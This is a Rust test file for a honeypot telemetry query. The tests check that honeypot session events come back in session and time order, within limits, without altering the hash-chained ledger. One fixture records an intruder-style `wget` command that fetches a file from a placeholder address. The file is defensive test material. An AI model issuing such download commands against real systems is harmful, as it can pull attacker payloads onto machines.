//! `coverage_events` is a scoped, ordered, bounded READ of the append-only ledger: it returns
//! only the four coverage signals that carry a session, grouped by session and ordered within it,
//! and it leaves the ledger and its hash chain exactly as it found them.

use core_scoring::repository::replay::ChainStatus;
use core_scoring::{
    EventInput, Protocol, SignalType, append_event, append_telemetry_event, coverage_events,
    verify_chain,
};
use serde_json::json;
use sqlx::PgPool;
use uuid::Uuid;

fn event(
    signal: SignalType,
    ts: &str,
    metadata: serde_json::Value,
    session: Option<Uuid>,
) -> EventInput {
    EventInput::from_signal(
        "203.0.113.7".parse().unwrap(),
        None,
        "sensor-a".into(),
        signal,
        Protocol::Tcp,
        true,
        ts.parse().unwrap(),
        metadata,
        session,
    )
}

fn exec(ts: &str, class: &str, base: &str, command: &str, session: Option<Uuid>) -> EventInput {
    event(
        SignalType::HoneypotCommandExec,
        ts,
        json!({"classification": class, "command_basename": base, "command": command}),
        session,
    )
}

async fn seed(pool: &PgPool, s1: Uuid, s2: Uuid) {
    let events = [
        // Session s2 first in the ledger, so ledger order differs from (session, time) order.
        exec(
            "2026-10-01T10:00:00Z",
            "unknown",
            "zap",
            "zap --now",
            Some(s2),
        ),
        // Session s1, appended out of time order: the download is stored before the command.
        event(
            SignalType::HoneypotFileDownload,
            "2026-10-01T10:00:30Z",
            json!({"url": "http://203.0.113.9/a"}),
            Some(s1),
        ),
        exec(
            "2026-10-01T10:00:10Z",
            "partial",
            "wget",
            "wget http://203.0.113.9/a",
            Some(s1),
        ),
        // No classification (recorded before 7a) and no basename.
        event(
            SignalType::HoneypotCommandExec,
            "2026-10-01T10:00:20Z",
            json!({"command": "old line"}),
            Some(s1),
        ),
        event(
            SignalType::HoneypotLoginAttempt,
            "2026-10-01T10:00:05Z",
            json!({"command": "must not be read for a login"}),
            Some(s1),
        ),
        event(
            SignalType::HoneypotMalwareUpload,
            "2026-10-01T10:00:40Z",
            json!({}),
            Some(s1),
        ),
        // Excluded: no session, a signal outside the four.
        exec("2026-10-01T10:00:11Z", "unknown", "ghost", "ghost", None),
        event(
            SignalType::HoneypotConnection,
            "2026-10-01T10:00:01Z",
            json!({}),
            Some(s1),
        ),
    ];
    for e in events {
        append_event(pool, e).await.unwrap();
    }
    append_telemetry_event(
        pool,
        event(
            SignalType::HoneypotSessionEnd,
            "2026-10-01T10:00:50Z",
            json!({"reason": "peer_closed"}),
            Some(s1),
        ),
    )
    .await
    .unwrap();
}

#[sqlx::test(migrations = "./migrations")]
async fn returns_only_session_scoped_coverage_signals_in_session_time_order(pool: PgPool) {
    let (s1, s2) = (Uuid::from_u128(1), Uuid::from_u128(2));
    seed(&pool, s1, s2).await;

    let out = coverage_events(&pool, None, None, 100).await.unwrap();
    assert!(!out.truncated);
    let at = |s: &str| -> chrono::DateTime<chrono::Utc> { s.parse().unwrap() };
    let got: Vec<_> = out
        .rows
        .iter()
        .map(|r| (r.session_id, r.signal_type, r.observed_at))
        .collect();
    assert_eq!(
        got,
        vec![
            (
                s1,
                SignalType::HoneypotLoginAttempt,
                at("2026-10-01T10:00:05Z")
            ),
            (
                s1,
                SignalType::HoneypotCommandExec,
                at("2026-10-01T10:00:10Z")
            ),
            (
                s1,
                SignalType::HoneypotCommandExec,
                at("2026-10-01T10:00:20Z")
            ),
            (
                s1,
                SignalType::HoneypotFileDownload,
                at("2026-10-01T10:00:30Z")
            ),
            (
                s1,
                SignalType::HoneypotMalwareUpload,
                at("2026-10-01T10:00:40Z")
            ),
            (
                s2,
                SignalType::HoneypotCommandExec,
                at("2026-10-01T10:00:00Z")
            ),
        ]
    );

    let wget = &out.rows[1];
    assert_eq!(wget.classification.as_deref(), Some("partial"));
    assert_eq!(wget.command_basename.as_deref(), Some("wget"));
    assert_eq!(wget.command.as_deref(), Some("wget http://203.0.113.9/a"));
    // A pre-7a command carries its text but no classification or basename.
    let old = &out.rows[2];
    assert_eq!(old.classification, None);
    assert_eq!(old.command_basename, None);
    assert_eq!(old.command.as_deref(), Some("old line"));
    // Metadata is read for command events only.
    for r in &out.rows {
        if r.signal_type != SignalType::HoneypotCommandExec {
            assert_eq!(
                (&r.classification, &r.command_basename, &r.command),
                (&None, &None, &None),
                "{r:?}"
            );
        }
    }
}

#[sqlx::test(migrations = "./migrations")]
async fn window_and_row_cap_bound_the_read_and_it_changes_nothing(pool: PgPool) {
    let (s1, s2) = (Uuid::from_u128(1), Uuid::from_u128(2));
    seed(&pool, s1, s2).await;
    let count_before: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM event")
        .fetch_one(&pool)
        .await
        .unwrap();

    // since/until are inclusive: 10:00:10 ..= 10:00:30 keeps wget, the old line, the download.
    let t = |s: &str| Some(s.parse().unwrap());
    let windowed = coverage_events(
        &pool,
        t("2026-10-01T10:00:10Z"),
        t("2026-10-01T10:00:30Z"),
        100,
    )
    .await
    .unwrap();
    assert_eq!(windowed.rows.len(), 3);
    assert!(windowed.rows.iter().all(|r| r.session_id == s1));

    // A cap below the match count reports truncation and returns exactly `limit` ordered rows.
    let capped = coverage_events(&pool, None, None, 2).await.unwrap();
    assert!(capped.truncated);
    assert_eq!(capped.rows.len(), 2);
    assert_eq!(capped.rows[0].signal_type, SignalType::HoneypotLoginAttempt);
    // A cap equal to the match count is not truncation.
    let exact = coverage_events(&pool, None, None, 6).await.unwrap();
    assert!(!exact.truncated);
    assert_eq!(exact.rows.len(), 6);

    let count_after: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM event")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(count_before, count_after);
    assert_eq!(verify_chain(&pool).await.unwrap(), ChainStatus::Intact);
}

#[sqlx::test(migrations = "./migrations")]
async fn an_empty_ledger_reads_as_no_rows(pool: PgPool) {
    let out = coverage_events(&pool, None, None, 10).await.unwrap();
    assert!(out.rows.is_empty());
    assert!(!out.truncated);
}
